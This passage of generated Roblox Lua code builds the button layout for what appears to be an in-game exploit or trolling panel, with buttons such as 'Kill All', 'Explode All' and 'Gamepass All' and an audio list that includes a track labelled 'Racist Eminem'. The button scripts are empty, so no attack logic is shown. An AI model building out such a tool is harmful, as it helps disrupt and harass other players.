		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["28"] = Instance.new("TextButton", G2L["5"]);
		G2L["28"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["28"]["TextSize"] = 20;
		G2L["28"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["28"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["28"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["28"]["ClipsDescendants"] = true;
		G2L["28"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["28"]["Text"] = [[Sparkles All]];
		G2L["28"]["Position"] = UDim2.new(0.7625, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["29"] = Instance.new("LocalScript", G2L["28"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["2a"] = Instance.new("TextButton", G2L["5"]);
		G2L["2a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["2a"]["TextSize"] = 20;
		G2L["2a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["2a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["2a"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["2a"]["ClipsDescendants"] = true;
		G2L["2a"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["2a"]["Text"] = [[Place All]];
		G2L["2a"]["Position"] = UDim2.new(0.0125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["2b"] = Instance.new("LocalScript", G2L["2a"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["2c"] = Instance.new("TextButton", G2L["5"]);
		G2L["2c"]["TextWrapped"] = true;
		G2L["2c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["2c"]["TextSize"] = 20;
		G2L["2c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["2c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["2c"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["2c"]["ClipsDescendants"] = true;
		G2L["2c"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["2c"]["Text"] = [[God All]];
		G2L["2c"]["Position"] = UDim2.new(0.2625, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["2d"] = Instance.new("LocalScript", G2L["2c"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["2e"] = Instance.new("TextButton", G2L["5"]);
		G2L["2e"]["TextWrapped"] = true;
		G2L["2e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["2e"]["TextSize"] = 20;
		G2L["2e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["2e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["2e"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["2e"]["ClipsDescendants"] = true;
		G2L["2e"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["2e"]["Text"] = [[Explode All]];
		G2L["2e"]["Position"] = UDim2.new(0.5125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["2f"] = Instance.new("LocalScript", G2L["2e"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["30"] = Instance.new("TextButton", G2L["5"]);
		G2L["30"]["TextWrapped"] = true;
		G2L["30"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["30"]["TextSize"] = 20;
		G2L["30"]["TextScaled"] = true;
		G2L["30"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["30"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["30"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["30"]["ClipsDescendants"] = true;
		G2L["30"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["30"]["Text"] = [[Remove Decorations]];
		G2L["30"]["Position"] = UDim2.new(0.7625, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["31"] = Instance.new("LocalScript", G2L["30"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["32"] = Instance.new("TextButton", G2L["5"]);
		G2L["32"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["32"]["TextSize"] = 20;
		G2L["32"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["32"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["32"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["32"]["ClipsDescendants"] = true;
		G2L["32"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["32"]["Text"] = [[Char All]];
		G2L["32"]["Position"] = UDim2.new(0.0125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["33"] = Instance.new("LocalScript", G2L["32"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["34"] = Instance.new("TextButton", G2L["5"]);
		G2L["34"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["34"]["TextSize"] = 20;
		G2L["34"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["34"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["34"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["34"]["ClipsDescendants"] = true;
		G2L["34"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["34"]["Text"] = [[UnDisco]];
		G2L["34"]["Position"] = UDim2.new(0.2625, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["35"] = Instance.new("LocalScript", G2L["34"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["36"] = Instance.new("TextButton", G2L["5"]);
		G2L["36"]["TextWrapped"] = true;
		G2L["36"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["36"]["TextSize"] = 20;
		G2L["36"]["TextScaled"] = true;
		G2L["36"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["36"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["36"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["36"]["ClipsDescendants"] = true;
		G2L["36"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["36"]["Text"] = [[Remove Decals]];
		G2L["36"]["Position"] = UDim2.new(0.5125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["37"] = Instance.new("LocalScript", G2L["36"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["38"] = Instance.new("TextButton", G2L["5"]);
		G2L["38"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["38"]["TextSize"] = 20;
		G2L["38"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["38"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["38"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["38"]["ClipsDescendants"] = true;
		G2L["38"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["38"]["Text"] = [[Spin All]];
		G2L["38"]["Position"] = UDim2.new(0.7625, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["39"] = Instance.new("LocalScript", G2L["38"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["3a"] = Instance.new("TextButton", G2L["5"]);
		G2L["3a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["3a"]["TextSize"] = 20;
		G2L["3a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["3a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["3a"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["3a"]["ClipsDescendants"] = true;
		G2L["3a"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["3a"]["Text"] = [[R6 All]];
		G2L["3a"]["Position"] = UDim2.new(0.77375, 0, 0.30714, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["3b"] = Instance.new("LocalScript", G2L["3a"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["3c"] = Instance.new("TextButton", G2L["5"]);
		G2L["3c"]["TextWrapped"] = true;
		G2L["3c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["3c"]["TextSize"] = 20;
		G2L["3c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["3c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["3c"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["3c"]["ClipsDescendants"] = true;
		G2L["3c"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["3c"]["Text"] = [[Carl All]];
		G2L["3c"]["Position"] = UDim2.new(0.0125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["3d"] = Instance.new("LocalScript", G2L["3c"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["3e"] = Instance.new("TextButton", G2L["5"]);
		G2L["3e"]["TextWrapped"] = true;
		G2L["3e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["3e"]["TextSize"] = 20;
		G2L["3e"]["TextScaled"] = true;
		G2L["3e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["3e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["3e"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["3e"]["ClipsDescendants"] = true;
		G2L["3e"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["3e"]["Text"] = [[Gravity Hammer]];
		G2L["3e"]["Position"] = UDim2.new(0.2625, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["3f"] = Instance.new("LocalScript", G2L["3e"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["40"] = Instance.new("TextButton", G2L["5"]);
		G2L["40"]["TextWrapped"] = true;
		G2L["40"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["40"]["TextSize"] = 20;
		G2L["40"]["TextScaled"] = true;
		G2L["40"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["40"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["40"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["40"]["ClipsDescendants"] = true;
		G2L["40"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["40"]["Text"] = [[Loop Message]];
		G2L["40"]["Position"] = UDim2.new(0.5125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["41"] = Instance.new("LocalScript", G2L["40"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["42"] = Instance.new("TextButton", G2L["5"]);
		G2L["42"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["42"]["TextSize"] = 20;
		G2L["42"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["42"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["42"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["42"]["ClipsDescendants"] = true;
		G2L["42"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["42"]["Text"] = [[Limbless All]];
		G2L["42"]["Position"] = UDim2.new(0.7625, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["43"] = Instance.new("LocalScript", G2L["42"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["44"] = Instance.new("TextButton", G2L["5"]);
		G2L["44"]["TextWrapped"] = true;
		G2L["44"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["44"]["TextSize"] = 20;
		G2L["44"]["TextScaled"] = true;
		G2L["44"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["44"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["44"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["44"]["ClipsDescendants"] = true;
		G2L["44"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["44"]["Text"] = [[Gamepass All]];
		G2L["44"]["Position"] = UDim2.new(0.0125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["45"] = Instance.new("LocalScript", G2L["44"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["46"] = Instance.new("TextButton", G2L["5"]);
		G2L["46"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["46"]["TextSize"] = 20;
		G2L["46"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["46"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["46"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["46"]["ClipsDescendants"] = true;
		G2L["46"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["46"]["Text"] = [[Title All]];
		G2L["46"]["Position"] = UDim2.new(0.2625, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["47"] = Instance.new("LocalScript", G2L["46"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["48"] = Instance.new("TextButton", G2L["5"]);
		G2L["48"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["48"]["TextSize"] = 20;
		G2L["48"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["48"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["48"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["48"]["ClipsDescendants"] = true;
		G2L["48"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["48"]["Text"] = [[Warp All]];
		G2L["48"]["Position"] = UDim2.new(0.5125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["49"] = Instance.new("LocalScript", G2L["48"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["4a"] = Instance.new("TextButton", G2L["5"]);
		G2L["4a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["4a"]["TextSize"] = 20;
		G2L["4a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["4a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["4a"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["4a"]["ClipsDescendants"] = true;
		G2L["4a"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["4a"]["Text"] = [[Baseplate]];
		G2L["4a"]["Position"] = UDim2.new(0.2625, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["4b"] = Instance.new("LocalScript", G2L["4a"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["4c"] = Instance.new("TextButton", G2L["5"]);
		G2L["4c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["4c"]["TextSize"] = 20;
		G2L["4c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["4c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["4c"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["4c"]["ClipsDescendants"] = true;
		G2L["4c"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["4c"]["Text"] = [[R15 All]];
		G2L["4c"]["Position"] = UDim2.new(0.5125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["4d"] = Instance.new("LocalScript", G2L["4c"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["4e"] = Instance.new("TextButton", G2L["5"]);
		G2L["4e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["4e"]["TextSize"] = 20;
		G2L["4e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["4e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["4e"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["4e"]["ClipsDescendants"] = true;
		G2L["4e"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["4e"]["Text"] = [[Kill All]];
		G2L["4e"]["Position"] = UDim2.new(0.2625, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["4f"] = Instance.new("LocalScript", G2L["4e"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["50"] = Instance.new("TextButton", G2L["5"]);
		G2L["50"]["TextWrapped"] = true;
		G2L["50"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["50"]["TextSize"] = 20;
		G2L["50"]["TextScaled"] = true;
		G2L["50"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["50"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["50"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["50"]["ClipsDescendants"] = true;
		G2L["50"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["50"]["Text"] = [[INV Torso All]];
		G2L["50"]["Position"] = UDim2.new(0.5125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["51"] = Instance.new("LocalScript", G2L["50"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["52"] = Instance.new("TextButton", G2L["5"]);
		G2L["52"]["TextWrapped"] = true;
		G2L["52"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["52"]["TextSize"] = 20;
		G2L["52"]["TextScaled"] = true;
		G2L["52"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["52"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["52"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["52"]["ClipsDescendants"] = true;
		G2L["52"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["52"]["Text"] = [[Remove Lights]];
		G2L["52"]["Position"] = UDim2.new(0.2625, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["53"] = Instance.new("LocalScript", G2L["52"]);
	
	
	
		-- StarterGui.v2.Frame.TextLabel
		G2L["54"] = Instance.new("TextLabel", G2L["2"]);
		G2L["54"]["BorderSizePixel"] = 0;
		G2L["54"]["TextSize"] = 30;
		G2L["54"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["54"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["54"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["54"]["BackgroundTransparency"] = 1;
		G2L["54"]["RichText"] = true;
		G2L["54"]["Size"] = UDim2.new(0, 400, 0, 50);
		G2L["54"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["54"]["Text"] = [[------ [ AUDIOS ] ------]];
		G2L["54"]["Position"] = UDim2.new(0, 0, 0.56298, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame
		G2L["55"] = Instance.new("ScrollingFrame", G2L["2"]);
		G2L["55"]["Active"] = true;
		G2L["55"]["BorderSizePixel"] = 2;
		G2L["55"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["55"]["Size"] = UDim2.new(0, 400, 0, 140);
		G2L["55"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["55"]["Position"] = UDim2.new(0, 0, 0.67756, 0);
		G2L["55"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["55"]["ScrollBarThickness"] = 0;
		G2L["55"]["BackgroundTransparency"] = 0.05;
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.UIGridLayout
		G2L["56"] = Instance.new("UIGridLayout", G2L["55"]);
		G2L["56"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
		G2L["56"]["CellSize"] = UDim2.new(0, 90, 0, 30);
		G2L["56"]["FillDirectionMaxCells"] = 4;
		G2L["56"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
		G2L["56"]["CellPadding"] = UDim2.new(0, 13, 0, 13);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["57"] = Instance.new("TextButton", G2L["55"]);
		G2L["57"]["TextWrapped"] = true;
		G2L["57"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["57"]["TextSize"] = 20;
		G2L["57"]["TextScaled"] = true;
		G2L["57"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["57"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["57"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["57"]["ClipsDescendants"] = true;
		G2L["57"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["57"]["Text"] = [[Stadium Rave]];
		G2L["57"]["Position"] = UDim2.new(0.0125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["58"] = Instance.new("LocalScript", G2L["57"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["59"] = Instance.new("TextButton", G2L["55"]);
		G2L["59"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["59"]["TextSize"] = 20;
		G2L["59"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["59"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["59"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["59"]["ClipsDescendants"] = true;
		G2L["59"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["59"]["Text"] = [[679]];
		G2L["59"]["Position"] = UDim2.new(0.2625, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["5a"] = Instance.new("LocalScript", G2L["59"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["5b"] = Instance.new("TextButton", G2L["55"]);
		G2L["5b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["5b"]["TextSize"] = 20;
		G2L["5b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["5b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["5b"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["5b"]["ClipsDescendants"] = true;
		G2L["5b"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["5b"]["Text"] = [[Body Rolls]];
		G2L["5b"]["Position"] = UDim2.new(0.7625, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["5c"] = Instance.new("LocalScript", G2L["5b"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["5d"] = Instance.new("TextButton", G2L["55"]);
		G2L["5d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["5d"]["TextSize"] = 20;
		G2L["5d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["5d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["5d"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["5d"]["ClipsDescendants"] = true;
		G2L["5d"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["5d"]["Text"] = [[Lazytown]];
		G2L["5d"]["Position"] = UDim2.new(0.7625, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["5e"] = Instance.new("LocalScript", G2L["5d"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["5f"] = Instance.new("TextButton", G2L["55"]);
		G2L["5f"]["TextWrapped"] = true;
		G2L["5f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["5f"]["TextSize"] = 20;
		G2L["5f"]["TextScaled"] = true;
		G2L["5f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["5f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["5f"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["5f"]["ClipsDescendants"] = true;
		G2L["5f"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["5f"]["Text"] = [[Racist Eminem]];
		G2L["5f"]["Position"] = UDim2.new(0.0125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["60"] = Instance.new("LocalScript", G2L["5f"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["61"] = Instance.new("TextButton", G2L["55"]);
		G2L["61"]["TextWrapped"] = true;
		G2L["61"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["61"]["TextSize"] = 20;
		G2L["61"]["TextScaled"] = true;
		G2L["61"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["61"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["61"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["61"]["ClipsDescendants"] = true;
		G2L["61"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["61"]["Text"] = [[Mining Away]];
		G2L["61"]["Position"] = UDim2.new(0.2625, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["62"] = Instance.new("LocalScript", G2L["61"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["63"] = Instance.new("TextButton", G2L["55"]);
		G2L["63"]["TextWrapped"] = true;
		G2L["63"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["63"]["TextSize"] = 20;
		G2L["63"]["TextScaled"] = true;
		G2L["63"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["63"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["63"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["63"]["ClipsDescendants"] = true;
		G2L["63"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["63"]["Text"] = [[Rupert Remix]];
		G2L["63"]["Position"] = UDim2.new(0.5125, 0, 0.25, 0);
	
	
